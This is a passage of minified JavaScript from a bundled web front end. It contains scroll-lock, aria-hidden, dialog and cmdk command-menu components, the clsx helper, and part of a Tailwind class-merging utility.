    return (d && (0 === f || !o) || !d && (0 === v || !o)) && (u = !0), u;
  },
  vi = function (e) {
    return "changedTouches" in e ? [e.changedTouches[0].clientX, e.changedTouches[0].clientY] : [0, 0];
  },
  lf = function (e) {
    return [e.deltaX, e.deltaY];
  },
  sf = function (e) {
    return e && "current" in e ? e.current : e;
  },
  Sx = function (e, t) {
    return e[0] === t[0] && e[1] === t[1];
  },
  Ex = function (e) {
    return "\n  .block-interactivity-".concat(e, " {pointer-events: none;}\n  .allow-interactivity-").concat(e, " {pointer-events: all;}\n");
  },
  Cx = 0,
  Gn = [];
function kx(e) {
  var t = c.useRef([]),
    n = c.useRef([0, 0]),
    r = c.useRef(),
    o = c.useState(Cx++)[0],
    i = c.useState(function () {
      return ic();
    })[0],
    l = c.useRef(e);
  c.useEffect(function () {
    l.current = e;
  }, [e]), c.useEffect(function () {
    if (e.inert) {
      document.body.classList.add("block-interactivity-".concat(o));
      var h = cv([e.lockRef.current], (e.shards || []).map(sf), !0).filter(Boolean);
      return h.forEach(function (w) {
        return w.classList.add("allow-interactivity-".concat(o));
      }), function () {
        document.body.classList.remove("block-interactivity-".concat(o)), h.forEach(function (w) {
          return w.classList.remove("allow-interactivity-".concat(o));
        });
      };
    }
  }, [e.inert, e.lockRef.current, e.shards]);
  var s = c.useCallback(function (h, w) {
      if ("touches" in h && 2 === h.touches.length) return !l.current.allowPinchZoom;
      var C,
        m = vi(h),
        p = n.current,
        y = "deltaX" in h ? h.deltaX : p[0] - m[0],
        S = "deltaY" in h ? h.deltaY : p[1] - m[1],
        P = h.target,
        k = Math.abs(y) > Math.abs(S) ? "h" : "v";
      if ("touches" in h && "h" === k && "range" === P.type) return !1;
      var b = of(k, P);
      if (!b) return !0;
      if (b ? C = k : (C = "v" === k ? "h" : "v", b = of(k, P)), !b) return !1;
      if (!r.current && "changedTouches" in h && (y || S) && (r.current = C), !C) return !0;
      var T = r.current || C;
      return xx(T, w, h, "h" === T ? y : S, !0);
    }, []),
    a = c.useCallback(function (h) {
      var w = h;
      if (Gn.length && Gn[Gn.length - 1] === i) {
        var m = "deltaY" in w ? lf(w) : vi(w),
          p = t.current.filter(function (C) {
            return C.name === w.type && C.target === w.target && Sx(C.delta, m);
          })[0];
        if (p && p.should) return void (w.cancelable && w.preventDefault());
        if (!p) {
          var y = (l.current.shards || []).map(sf).filter(Boolean).filter(function (C) {
            return C.contains(w.target);
          });
          (y.length > 0 ? s(w, y[0]) : !l.current.noIsolation) && w.cancelable && w.preventDefault();
        }
      }
    }, []),
    u = c.useCallback(function (h, w, m, p) {
      var y = {
        name: h,
        delta: w,
        target: m,
        should: p
      };
      t.current.push(y), setTimeout(function () {
        t.current = t.current.filter(function (S) {
          return S !== y;
        });
      }, 1);
    }, []),
    d = c.useCallback(function (h) {
      n.current = vi(h), r.current = void 0;
    }, []),
    f = c.useCallback(function (h) {
      u(h.type, lf(h), h.target, s(h, e.lockRef.current));
    }, []),
    v = c.useCallback(function (h) {
      u(h.type, vi(h), h.target, s(h, e.lockRef.current));
    }, []);
  c.useEffect(function () {
    return Gn.push(i), e.setCallbacks({
      onScrollCapture: f,
      onWheelCapture: f,
      onTouchMoveCapture: v
    }), document.addEventListener("wheel", a, Kn), document.addEventListener("touchmove", a, Kn), document.addEventListener("touchstart", d, Kn), function () {
      Gn = Gn.filter(function (h) {
        return h !== i;
      }), document.removeEventListener("wheel", a, Kn), document.removeEventListener("touchmove", a, Kn), document.removeEventListener("touchstart", d, Kn);
    };
  }, []);
  var g = e.removeScrollBar,
    x = e.inert;
  return c.createElement(c.Fragment, null, x ? c.createElement(i, {
    styles: Ex(o)
  }) : null, g ? c.createElement(hv, {
    gapMode: "margin"
  }) : null);
}
const Px = mv(vv, kx);
var xv = c.forwardRef(function (e, t) {
  return c.createElement(Fl, Se({}, e, {
    ref: t,
    sideCar: Px
  }));
});
xv.classNames = Fl.classNames;
var _x = function (e) {
    return typeof document > "u" ? null : (Array.isArray(e) ? e[0] : e).ownerDocument.body;
  },
  Qn = new WeakMap(),
  hi = new WeakMap(),
  gi = {},
  Os = 0,
  Sv = function (e) {
    return e && (e.host || Sv(e.parentNode));
  },
  bx = function (e, t) {
    return t.map(function (n) {
      if (e.contains(n)) return n;
      var r = Sv(n);
      return r && e.contains(r) ? r : (console.error("aria-hidden", n, "in not contained inside", e, ". Doing nothing"), null);
    }).filter(function (n) {
      return !!n;
    });
  },
  Nx = function (e, t, n, r) {
    var o = bx(t, Array.isArray(e) ? e : [e]);
    gi[n] || (gi[n] = new WeakMap());
    var i = gi[n],
      l = [],
      s = new Set(),
      a = new Set(o),
      u = function (f) {
        !f || s.has(f) || (s.add(f), u(f.parentNode));
      };
    o.forEach(u);
    var d = function (f) {
      !f || a.has(f) || Array.prototype.forEach.call(f.children, function (v) {
        if (s.has(v)) d(v);else try {
          var g = v.getAttribute(r),
            x = null !== g && "false" !== g,
            h = (Qn.get(v) || 0) + 1,
            w = (i.get(v) || 0) + 1;
          Qn.set(v, h), i.set(v, w), l.push(v), 1 === h && x && hi.set(v, !0), 1 === w && v.setAttribute(n, "true"), x || v.setAttribute(r, "true");
        } catch (m) {
          console.error("aria-hidden: cannot operate on ", v, m);
        }
      });
    };
    return d(t), s.clear(), Os++, function () {
      l.forEach(function (f) {
        var v = Qn.get(f) - 1,
          g = i.get(f) - 1;
        Qn.set(f, v), i.set(f, g), v || (hi.has(f) || f.removeAttribute(r), hi.delete(f)), g || f.removeAttribute(n);
      }), --Os || (Qn = new WeakMap(), Qn = new WeakMap(), hi = new WeakMap(), gi = {});
    };
  },
  lc = function (e, t, n) {
    void 0 === n && (n = "data-aria-hidden");
    var r = Array.from(Array.isArray(e) ? e : [e]),
      o = _x(e);
    return o ? (r.push.apply(r, Array.from(o.querySelectorAll("[aria-live]"))), Nx(r, o, n, "aria-hidden")) : function () {
      return null;
    };
  };
const Ev = "Dialog",
  [Cv, OP] = Sw(Ev),
  [$x, Vn] = Cv(Ev),
  Rx = e => {
    const {
        __scopeDialog: t,
        children: n,
        open: r,
        defaultOpen: o,
        onOpenChange: i,
        modal: l = !0
      } = e,
      s = c.useRef(null),
      a = c.useRef(null),
      [u = !1, d] = Pw({
        prop: r,
        defaultProp: o,
        onChange: i
      });
    return c.createElement($x, {
      scope: t,
      triggerRef: s,
      contentRef: a,
      contentId: ks(),
      titleId: ks(),
      descriptionId: ks(),
      open: u,
      onOpenChange: d,
      onOpenToggle: c.useCallback(() => d(f => !f), [d]),
      modal: l
    }, n);
  },
  kv = "DialogPortal",
  [Ox, Pv] = Cv(kv, {
    forceMount: void 0
  }),
  Ax = e => {
    const {
        __scopeDialog: t,
        forceMount: n,
        children: r,
        container: o
      } = e,
      i = Vn(kv, t);
    return c.createElement(Ox, {
      scope: t,
      forceMount: n
    }, c.Children.map(r, l => c.createElement(zl, {
      present: n || i.open
    }, c.createElement(Kw, {
      asChild: !0,
      container: o
    }, l))));
  },
  Va = "DialogOverlay",
  Tx = c.forwardRef((e, t) => {
    const n = Pv(Va, e.__scopeDialog),
      {
        forceMount: r = n.forceMount,
        ...o
      } = e,
      i = Vn(Va, e.__scopeDialog);
    return i.modal ? c.createElement(zl, {
      present: r || i.open
    }, c.createElement(Dx, _e({}, o, {
      ref: t
    }))) : null;
  }),
  Dx = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        ...r
      } = e,
      o = Vn(Va, n);
    return c.createElement(xv, {
      as: rc,
      allowPinchZoom: !0,
      shards: [o.contentRef]
    }, c.createElement(et.div, _e({
      "data-state": bv(o.open)
    }, r, {
      ref: t,
      style: {
        pointerEvents: "auto",
        ...r.style
      }
    })));
  }),
  $o = "DialogContent",
  Ix = c.forwardRef((e, t) => {
    const n = Pv($o, e.__scopeDialog),
      {
        forceMount: r = n.forceMount,
        ...o
      } = e,
      i = Vn($o, e.__scopeDialog);
    return c.createElement(zl, {
      present: r || i.open
    }, i.modal ? c.createElement(Mx, _e({}, o, {
      ref: t
    })) : c.createElement(Lx, _e({}, o, {
      ref: t
    })));
  }),
  Mx = c.forwardRef((e, t) => {
    const n = Vn($o, e.__scopeDialog),
      r = c.useRef(null),
      o = Wo(t, n.contentRef, r);
    return c.useEffect(() => {
      const i = r.current;
      if (i) return lc(i);
    }, []), c.createElement(_v, _e({}, e, {
      ref: o,
      trapFocus: n.open,
      disableOutsidePointerEvents: !0,
      onCloseAutoFocus: hr(e.onCloseAutoFocus, i => {
        var l;
        i.preventDefault(), null === (l = n.triggerRef.current) || void 0 === l || l.focus();
      }),
      onPointerDownOutside: hr(e.onPointerDownOutside, i => {
        const l = i.detail.originalEvent,
          s = 0 === l.button && !0 === l.ctrlKey;
        (2 === l.button || s) && i.preventDefault();
      }),
      onFocusOutside: hr(e.onFocusOutside, i => i.preventDefault())
    }));
  }),
  Lx = c.forwardRef((e, t) => {
    const n = Vn($o, e.__scopeDialog),
      r = c.useRef(!1),
      o = c.useRef(!1);
    return c.createElement(_v, _e({}, e, {
      ref: t,
      trapFocus: !1,
      disableOutsidePointerEvents: !1,
      onCloseAutoFocus: i => {
        var l, s;
        (null === (l = e.onCloseAutoFocus) || void 0 === l || l.call(e, i), i.defaultPrevented) || (r.current || null === (s = n.triggerRef.current) || void 0 === s || s.focus(), i.preventDefault());
        r.current = !1, o.current = !1;
      },
      onInteractOutside: i => {
        var l, s;
        null === (l = e.onInteractOutside) || void 0 === l || l.call(e, i), i.defaultPrevented || (r.current = !0, "pointerdown" === i.detail.originalEvent.type && (o.current = !0));
        const a = i.target;
        (null === (s = n.triggerRef.current) || void 0 === s ? void 0 : s.contains(a)) && i.preventDefault(), "focusin" === i.detail.originalEvent.type && o.current && i.preventDefault();
      }
    }));
  }),
  _v = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        trapFocus: r,
        onOpenAutoFocus: o,
        onCloseAutoFocus: i,
        ...l
      } = e,
      s = Vn($o, n),
      u = Wo(t, c.useRef(null));
    return Yw(), c.createElement(c.Fragment, null, c.createElement(zw, {
      asChild: !0,
      loop: !0,
      trapped: r,
      onMountAutoFocus: o,
      onUnmountAutoFocus: i
    }, c.createElement(Mw, _e({
      role: "dialog",
      id: s.contentId,
      "aria-describedby": s.descriptionId,
      "aria-labelledby": s.titleId,
      "data-state": bv(s.open)
    }, l, {
      ref: u,
      onDismiss: () => s.onOpenChange(!1)
    }))), !1);
  });
function bv(e) {
  return e ? "open" : "closed";
}
const jx = Rx,
  zx = Ax,
  Fx = Tx,
  Ux = Ix;
var Gr = '[cmdk-group=""]',
  As = '[cmdk-group-items=""]',
  Wx = '[cmdk-group-heading=""]',
  sc = '[cmdk-item=""]',
  af = `${sc}:not([aria-disabled="true"])`,
  Ha = "cmdk-item-select",
  xn = "data-value",
  Bx = (e, t, n) => ww(e, t, n),
  Nv = c.createContext(void 0),
  Bo = () => c.useContext(Nv),
  $v = c.createContext(void 0),
  ac = () => c.useContext($v),
  Rv = c.createContext(void 0),
  Ov = c.forwardRef((e, t) => {
    let n = Zn(() => {
        var _, L;
        return {
          search: "",
          value: null != (L = null != (_ = e.value) ? _ : e.defaultValue) ? L : "",
          filtered: {
            count: 0,
            items: new Map(),
            groups: new Set()
          }
        };
      }),
      r = Zn(() => new Set()),
      o = Zn(() => new Map()),
      i = Zn(() => new Map()),
      l = Zn(() => new Set()),
      s = Av(e),
      {
        label: a,
        children: u,
        value: d,
        onValueChange: f,
        filter: v,
        shouldFilter: g,
        loop: x,
        disablePointerSelection: h = !1,
        vimBindings: w = !0,
        ...m
      } = e,
      p = c.useId(),
      y = c.useId(),
      S = c.useId(),
      C = c.useRef(null),
      P = eS();
    Tn(() => {
      if (void 0 !== d) {
        let _ = d.trim();
        n.current.value = _, k.emit();
      }
    }, [d]), Tn(() => {
      P(6, Z);
    }, []);
    let k = c.useMemo(() => ({
        subscribe: _ => (l.current.add(_), () => l.current.delete(_)),
        snapshot: () => n.current,
        setState: (_, L, j) => {
          var D, B, X;
          if (!Object.is(n.current[_], L)) {
            if (n.current[_] = L, "search" === _) I(), O(), P(1, U);else if ("value" === _ && (j || P(5, Z), void 0 !== (null == (D = s.current) ? void 0 : D.value))) {
              let Ce = L !== null && L !== void 0 ? L : "";
              return void (null == (X = (B = s.current).onValueChange) || X.call(B, Ce));
            }
            k.emit();
          }
        },
        emit: () => {
          l.current.forEach(_ => _());
        }
      }), []),
      b = c.useMemo(() => ({
        value: (_, L, j) => {
          var D;
          L !== (null == (D = i.current.get(_)) ? void 0 : D.value) && (i.current.set(_, {
            value: L,
            keywords: j
          }), n.current.filtered.items.set(_, T(L, j)), P(2, () => {
            O(), k.emit();
          }));
        },
        item: (_, L) => (r.current.add(_), L && (o.current.has(L) ? o.current.get(L).add(_) : o.current.set(L, new Set([_]))), P(3, () => {
          I(), O(), n.current.value || U(), k.emit();
        }), () => {
          i.current.delete(_), r.current.delete(_), n.current.filtered.items.delete(_);
          let j = H();
          P(4, () => {
            I(), (null == j ? void 0 : j.getAttribute("id")) === _ && U(), k.emit();
          });
        }),
        group: _ => (o.current.has(_) || o.current.set(_, new Set()), () => {
          i.current.delete(_), o.current.delete(_);
        }),
        filter: () => s.current.shouldFilter,
        label: a || e["aria-label"],
        disablePointerSelection: h,
        listId: p,
        inputId: S,
        labelId: y,
        listInnerRef: C
      }), []);
    function T(_, L) {
      var j, D;
      let B = null != (D = null == (j = s.current) ? void 0 : j.filter) ? D : Bx;
      return _ ? B(_, n.current.search, L) : 0;
    }
    function O() {
      if (!n.current.search || !1 === s.current.shouldFilter) return;
      let _ = n.current.filtered.items,
        L = [];
      n.current.filtered.groups.forEach(D => {
        let B = o.current.get(D),
          X = 0;
        B.forEach(Ce => {
          let pt = _.get(Ce);
          X = Math.max(pt, X);
        }), L.push([D, X]);
      });
      let j = C.current;
      Q().sort((D, B) => {
        var X, Ce;
        let pt = D.getAttribute("id"),
          hn = B.getAttribute("id");
        return (null != (X = _.get(hn)) ? X : 0) - (null != (Ce = _.get(pt)) ? Ce : 0);
      }).forEach(D => {
        let B = D.closest(As);
        B ? B.appendChild(D.parentElement === B ? D : D.closest(`${As} > *`)) : j.appendChild(D.parentElement === j ? D : D.closest(`${As} > *`));
      }), L.sort((D, B) => B[1] - D[1]).forEach(D => {
        let B = C.current.querySelector(`${Gr}[${xn}="${encodeURIComponent(D[0])}"]`);
        null == B || B.parentElement.appendChild(B);
      });
    }
    function U() {
      let _ = Q().find(j => "true" !== j.getAttribute("aria-disabled")),
        L = null == _ ? void 0 : _.getAttribute(xn);
      k.setState("value", L || void 0);
    }
    function I() {
      var _, L, j, D;
      if (!n.current.search || !1 === s.current.shouldFilter) return void (n.current.filtered.count = r.current.size);
      n.current.filtered.groups = new Set();
      let B = 0;
      for (let X of r.current) {
        let hn = T(null != (L = null == (_ = i.current.get(X)) ? void 0 : _.value) ? L : "", null != (D = null == (j = i.current.get(X)) ? void 0 : j.keywords) ? D : []);
        n.current.filtered.items.set(X, hn), hn > 0 && B++;
      }
      for (let [X, Ce] of o.current) for (let pt of Ce) if (n.current.filtered.items.get(pt) > 0) {
        n.current.filtered.groups.add(X);
        break;
      }
      n.current.filtered.count = B;
    }
    function Z() {
      var _, L, j;
      let D = H();
      D && ((null == (_ = D.parentElement) ? void 0 : _.firstChild) === D && (null == (j = null == (L = D.closest(Gr)) ? void 0 : L.querySelector(Wx)) || j.scrollIntoView({
        block: "nearest"
      })), D.scrollIntoView({
        block: "nearest"
      }));
    }
    function H() {
      var _;
      return null == (_ = C.current) ? void 0 : _.querySelector(`${sc}[aria-selected="true"]`);
    }
    function Q() {
      var _;
      return Array.from(null == (_ = C.current) ? void 0 : _.querySelectorAll(af));
    }
    function Y(_) {
      let L = Q()[_];
      L && k.setState("value", L.getAttribute(xn));
    }
    function z(_) {
      var L;
      let j = H(),
        D = Q(),
        B = D.findIndex(Ce => Ce === j),
        X = D[B + _];
      null != (L = s.current) && L.loop && (X = B + _ < 0 ? D[D.length - 1] : B + _ === D.length ? D[0] : D[B + _]), X && k.setState("value", X.getAttribute(xn));
    }
    function $(_) {
      let D,
        L = H(),
        j = null == L ? void 0 : L.closest(Gr);
      for (; j && !D;) j = _ > 0 ? Jx(j, Gr) : qx(j, Gr), D = null == j ? void 0 : j.querySelector(af);
      D ? k.setState("value", D.getAttribute(xn)) : z(_);
    }
    let R = () => Y(Q().length - 1),
      M = _ => {
        _.preventDefault(), _.metaKey ? R() : _.altKey ? $(1) : z(1);
      },
      V = _ => {
        _.preventDefault(), _.metaKey ? Y(0) : _.altKey ? $(-1) : z(-1);
      };
    return c.createElement(et.div, {
      ref: t,
      tabIndex: -1,
      ...m,
      "cmdk-root": "",
      onKeyDown: _ => {
        var L;
        if (null == (L = m.onKeyDown) || L.call(m, _), !_.defaultPrevented) switch (_.key) {
          case "n":
          case "j":
            w && _.ctrlKey && M(_);
            break;
          case "ArrowDown":
            M(_);
            break;
          case "p":
          case "k":
            w && _.ctrlKey && V(_);
            break;
          case "ArrowUp":
            V(_);
            break;
          case "Home":
            _.preventDefault(), Y(0);
            break;
          case "End":
            _.preventDefault(), R();
            break;
          case "Enter":
            if (!_.nativeEvent.isComposing && 229 !== _.keyCode) {
              _.preventDefault();
              let j = H();
              if (j) {
                let D = new Event(Ha);
                j.dispatchEvent(D);
              }
            }
        }
      }
    }, c.createElement("label", {
      "cmdk-label": "",
      htmlFor: b.inputId,
      id: b.labelId,
      style: nS
    }, a), Ul(e, _ => c.createElement($v.Provider, {
      value: k
    }, c.createElement(Nv.Provider, {
      value: b
    }, _))));
  }),
  Vx = c.forwardRef((e, t) => {
    var n, r;
    let o = c.useId(),
      i = c.useRef(null),
      l = c.useContext(Rv),
      s = Bo(),
      a = Av(e),
      u = null != (r = null == (n = a.current) ? void 0 : n.forceMount) ? r : null == l ? void 0 : l.forceMount;
    Tn(() => {
      if (!u) return s.item(o, null == l ? void 0 : l.id);
    }, [u]);
    let d = Tv(o, i, [e.value, e.children, i], e.keywords),
      f = ac(),
      v = Dn(P => P.value && P.value === d.current),
      g = Dn(P => !(!u && !1 !== s.filter()) || !P.search || P.filtered.items.get(o) > 0);
    function x() {
      var P, k;
      h(), null == (k = (P = a.current).onSelect) || k.call(P, d.current);
    }
    function h() {
      f.setState("value", d.current, !0);
    }
    if (c.useEffect(() => {
      let P = i.current;
      if (P && !e.disabled) return P.addEventListener(Ha, x), () => P.removeEventListener(Ha, x);
    }, [g, e.onSelect, e.disabled]), !g) return null;
    let {
      disabled: w,
      value: m,
      onSelect: p,
      forceMount: y,
      keywords: S,
      ...C
    } = e;
    return c.createElement(et.div, {
      ref: Ro([i, t]),
      ...C,
      id: o,
      "cmdk-item": "",
      role: "option",
      "aria-disabled": !!w,
      "aria-selected": !!v,
      "data-disabled": !!w,
      "data-selected": !!v,
      onPointerMove: w || s.disablePointerSelection ? void 0 : h,
      onClick: w ? void 0 : x
    }, e.children);
  }),
  Hx = c.forwardRef((e, t) => {
    let {
        heading: n,
        children: r,
        forceMount: o,
        ...i
      } = e,
      l = c.useId(),
      s = c.useRef(null),
      a = c.useRef(null),
      u = c.useId(),
      d = Bo(),
      f = Dn(g => !(!o && !1 !== d.filter()) || !g.search || g.filtered.groups.has(l));
    Tn(() => d.group(l), []), Tv(l, s, [e.value, e.heading, a]);
    let v = c.useMemo(() => ({
      id: l,
      forceMount: o
    }), [o]);
    return c.createElement(et.div, {
      ref: Ro([s, t]),
      ...i,
      "cmdk-group": "",
      role: "presentation",
      hidden: !f || void 0
    }, n && c.createElement("div", {
      ref: a,
      "cmdk-group-heading": "",
      "aria-hidden": !0,
      id: u
    }, n), Ul(e, g => c.createElement("div", {
      "cmdk-group-items": "",
      role: "group",
      "aria-labelledby": n ? u : void 0
    }, c.createElement(Rv.Provider, {
      value: v
    }, g))));
  }),
  Kx = c.forwardRef((e, t) => {
    let {
        alwaysRender: n,
        ...r
      } = e,
      o = c.useRef(null),
      i = Dn(l => !l.search);
    return n || i ? c.createElement(et.div, {
      ref: Ro([o, t]),
      ...r,
      "cmdk-separator": "",
      role: "separator"
    }) : null;
  }),
  Gx = c.forwardRef((e, t) => {
    let {
        onValueChange: n,
        ...r
      } = e,
      o = null != e.value,
      i = ac(),
      l = Dn(d => d.search),
      s = Dn(d => d.value),
      a = Bo(),
      u = c.useMemo(() => {
        var d;
        let f = null == (d = a.listInnerRef.current) ? void 0 : d.querySelector(`${sc}[${xn}="${encodeURIComponent(s)}"]`);
        return null == f ? void 0 : f.getAttribute("id");
      }, []);
    return c.useEffect(() => {
      null != e.value && i.setState("search", e.value);
    }, [e.value]), c.createElement(et.input, {
      ref: t,
      ...r,
      "cmdk-input": "",
      autoComplete: "off",
      autoCorrect: "off",
      spellCheck: !1,
      "aria-autocomplete": "list",
      role: "combobox",
      "aria-expanded": !0,
      "aria-controls": a.listId,
      "aria-labelledby": a.labelId,
      "aria-activedescendant": u,
      id: a.inputId,
      type: "text",
      value: o ? e.value : l,
      onChange: d => {
        o || i.setState("search", d.target.value), null == n || n(d.target.value);
      }
    });
  }),
  Qx = c.forwardRef((e, t) => {
    let {
        children: n,
        label: r = "Suggestions",
        ...o
      } = e,
      i = c.useRef(null),
      l = c.useRef(null),
      s = Bo();
    return c.useEffect(() => {
      if (l.current && i.current) {
        let d,
          a = l.current,
          u = i.current,
          f = new ResizeObserver(() => {
            d = requestAnimationFrame(() => {
              let v = a.offsetHeight;
              u.style.setProperty("--cmdk-list-height", v.toFixed(1) + "px");
            });
          });
        return f.observe(a), () => {
          cancelAnimationFrame(d), f.unobserve(a);
        };
      }
    }, []), c.createElement(et.div, {
      ref: Ro([i, t]),
      ...o,
      "cmdk-list": "",
      role: "listbox",
      "aria-label": r,
      id: s.listId
    }, Ul(e, a => c.createElement("div", {
      ref: Ro([l, s.listInnerRef]),
      "cmdk-list-sizer": ""
    }, a)));
  }),
  Yx = c.forwardRef((e, t) => {
    let {
      open: n,
      onOpenChange: r,
      overlayClassName: o,
      contentClassName: i,
      container: l,
      ...s
    } = e;
    return c.createElement(jx, {
      open: n,
      onOpenChange: r
    }, c.createElement(zx, {
      container: l
    }, c.createElement(Fx, {
      "cmdk-overlay": "",
      className: o
    }), c.createElement(Ux, {
      "aria-label": e.label,
      "cmdk-dialog": "",
      className: i
    }, c.createElement(Ov, {
      ref: t,
      ...s
    }))));
  }),
  Xx = c.forwardRef((e, t) => Dn(n => 0 === n.filtered.count) ? c.createElement(et.div, {
    ref: t,
    ...e,
    "cmdk-empty": "",
    role: "presentation"
  }) : null),
  Zx = c.forwardRef((e, t) => {
    let {
      progress: n,
      children: r,
      label: o = "Loading...",
      ...i
    } = e;
    return c.createElement(et.div, {
      ref: t,
      ...i,
      "cmdk-loading": "",
      role: "progressbar",
      "aria-valuenow": n,
      "aria-valuemin": 0,
      "aria-valuemax": 100,
      "aria-label": o
    }, Ul(e, l => c.createElement("div", {
      "aria-hidden": !0
    }, l)));
  }),
  De = Object.assign(Ov, {
    List: Qx,
    Item: Vx,
    Input: Gx,
    Group: Hx,
    Separator: Kx,
    Dialog: Yx,
    Empty: Xx,
    Loading: Zx
  });
function Jx(e, t) {
  let n = e.nextElementSibling;
  for (; n;) {
    if (n.matches(t)) return n;
    n = n.nextElementSibling;
  }
}
function qx(e, t) {
  let n = e.previousElementSibling;
  for (; n;) {
    if (n.matches(t)) return n;
    n = n.previousElementSibling;
  }
}
function Av(e) {
  let t = c.useRef(e);
  return Tn(() => {
    t.current = e;
  }), t;
}
var Tn = typeof window > "u" ? c.useEffect : c.useLayoutEffect;
function Zn(e) {
  let t = c.useRef();
  return void 0 === t.current && (t.current = e()), t;
}
function Ro(e) {
  return t => {
    e.forEach(n => {
      "function" == typeof n ? n(t) : null != n && (n.current = t);
    });
  };
}
function Dn(e) {
  let t = ac(),
    n = () => e(t.snapshot());
  return c.useSyncExternalStore(t.subscribe, n, n);
}
function Tv(e, t, n, r = []) {
  let o = c.useRef(),
    i = Bo();
  return Tn(() => {
    var l;
    let s = (() => {
        var u;
        for (let d of n) {
          if ("string" == typeof d) return d.trim();
          if ("object" == typeof d && "current" in d) return d.current ? null == (u = d.current.textContent) ? void 0 : u.trim() : o.current;
        }
      })(),
      a = r.map(u => u.trim());
    i.value(e, s, a), null == (l = t.current) || l.setAttribute(xn, s), o.current = s;
  }), o;
}
var eS = () => {
  let [e, t] = c.useState(),
    n = Zn(() => new Map());
  return Tn(() => {
    n.current.forEach(r => r()), n.current = new Map();
  }, [e]), (r, o) => {
    n.current.set(r, o), t({});
  };
};
function tS(e) {
  let t = e.type;
  return "function" == typeof t ? t(e.props) : "render" in t ? t.render(e.props) : e;
}
function Ul({
  asChild: e,
  children: t
}, n) {
  return e && c.isValidElement(t) ? c.cloneElement(tS(t), {
    ref: t.ref
  }, n(t.props.children)) : n(t);
}
var nS = {
  position: "absolute",
  width: "1px",
  height: "1px",
  padding: "0",
  margin: "-1px",
  overflow: "hidden",
  clip: "rect(0, 0, 0, 0)",
  whiteSpace: "nowrap",
  borderWidth: "0"
};
function Dv(e) {
  var t,
    n,
    r = "";
  if ("string" == typeof e || "number" == typeof e) r += e;else if ("object" == typeof e) if (Array.isArray(e)) {
    var o = e.length;
    for (t = 0; t < o; t++) e[t] && (n = Dv(e[t])) && (r && (r += " "), r += n);
  } else for (n in e) e[n] && (r && (r += " "), r += n);
  return r;
}
function rS() {
  for (var e, t, n = 0, r = "", o = arguments.length; n < o; n++) (e = arguments[n]) && (t = Dv(e)) && (r && (r += " "), r += t);
  return r;
}
const uc = "-";
function oS(e) {
  const t = lS(e),
    {
      conflictingClassGroups: n,
      conflictingClassGroupModifiers: r
    } = e;
  return {
    getClassGroupId: function o(l) {
      const s = l.split(uc);
      return "" === s[0] && 1 !== s.length && s.shift(), Iv(s, t) || iS(l);
    },
    getConflictingClassGroupIds: function i(l, s) {
      const a = n[l] || [];
      return s && r[l] ? [...a, ...r[l]] : a;
    }
  };
}
function Iv(e, t) {
  var l;
  if (0 === e.length) return t.classGroupId;
  const n = e[0],
    r = t.nextPart.get(n),
    o = r ? Iv(e.slice(1), r) : void 0;
  if (o) return o;
  if (0 === t.validators.length) return;
  const i = e.join(uc);
  return null == (l = t.validators.find(({
    validator: s
  }) => s(i))) ? void 0 : l.classGroupId;
}
const uf = /^\[(.+)\]$/;
function iS(e) {
  if (uf.test(e)) {
    const t = uf.exec(e)[1],
      n = null == t ? void 0 : t.substring(0, t.indexOf(":"));
    if (n) return "arbitrary.." + n;
  }
}
function lS(e) {
  const {
      theme: t,
      prefix: n
    } = e,
    r = {
      nextPart: new Map(),
      validators: []
    };
  return aS(Object.entries(e.classGroups), n).forEach(([i, l]) => {
    Ka(l, r, i, t);
  }), r;
}
function Ka(e, t, n, r) {
  e.forEach(o => {
    if ("string" != typeof o) {
      if ("function" == typeof o) return sS(o) ? void Ka(o(r), t, n, r) : void t.validators.push({
        validator: o,
        classGroupId: n
      });
      Object.entries(o).forEach(([i, l]) => {
        Ka(l, cf(t, i), n, r);
      });
    } else {
      ("" === o ? t : cf(t, o)).classGroupId = n;
    }
  });
}
function cf(e, t) {
  let n = e;
  return t.split(uc).forEach(r => {
    n.nextPart.has(r) || n.nextPart.set(r, {
      nextPart: new Map(),
      validators: []
    }), n = n.nextPart.get(r);
  }), n;
}
function sS(e) {
  return e.isThemeGetter;
}
function aS(e, t) {
  return t ? e.map(([n, r]) => [n, r.map(i => "string" == typeof i ? t + i : "object" == typeof i ? Object.fromEntries(Object.entries(i).map(([l, s]) => [t + l, s])) : i)]) : e;
}
function uS(e) {
  if (e < 1) return {
    get: () => {},
    set: () => {}
  };
  let t = 0,
    n = new Map(),
    r = new Map();
  function o(i, l) {
    n.set(i, l), t++, t > e && (t = 0, r = n, n = new Map());
  }
  return {
    get(i) {
      let l = n.get(i);
      return void 0 !== l ? l : void 0 !== (l = r.get(i)) ? (o(i, l), l) : void 0;
    },
    set(i, l) {
      n.has(i) ? n.set(i, l) : o(i, l);
    }
  };
}
const Mv = "!";
function cS(e) {
  const {
      separator: t,
      experimentalParseClassName: n
    } = e,
    r = 1 === t.length,
    o = t[0],
    i = t.length;
  function l(s) {
    const a = [];
    let f,
      u = 0,
      d = 0;
    for (let w = 0; w < s.length; w++) {
      let m = s[w];
      if (0 === u) {
        if (m === o && (r || s.slice(w, w + i) === t)) {
          a.push(s.slice(d, w)), d = w + i;
          continue;
        }
        if ("/" === m) {
          f = w;
          continue;
        }
      }
      "[" === m ? u++ : "]" === m && u--;
    }
    const v = 0 === a.length ? s : s.substring(d),
      g = v.startsWith(Mv);
    return {
      modifiers: a,
      hasImportantModifier: g,
      baseClassName: g ? v.substring(1) : v,
      maybePostfixModifierPosition: f && f > d ? f - d : void 0
    };
  }
  return n ? function (a) {
    return n({
      className: a,
      parseClassName: l
    });
  } : l;
}
function dS(e) {
  if (e.length <= 1) return e;
  const t = [];
  let n = [];
  return e.forEach(r => {
    "[" === r[0] ? (t.push(...n.sort(), r), n = []) : n.push(r);
  }), t.push(...n.sort()), t;
}
function fS(e) {
  return {
    cache: uS(e.cacheSize),
    parseClassName: cS(e),
    ...oS(e)
  };
}
const pS = /\s+/;
function mS(e, t) {
  const {
      parseClassName: n,
      getClassGroupId: r,
      getConflictingClassGroupIds: o
    } = t,
    i = new Set();
  return e.trim().split(pS).map(l => {
    const {
      modifiers: s,
      hasImportantModifier: a,
      baseClassName: u,
      maybePostfixModifierPosition: d
    } = n(l);
    let f = !!d,
      v = r(f ? u.substring(0, d) : u);
    if (!v) {
      if (!f) return {
        isTailwindClass: !1,
        originalClassName: l
      };
      if (v = r(u), !v) return {
        isTailwindClass: !1,
        originalClassName: l
      };
      f = !1;
    }
    const g = dS(s).join(":");
    return {
      isTailwindClass: !0,
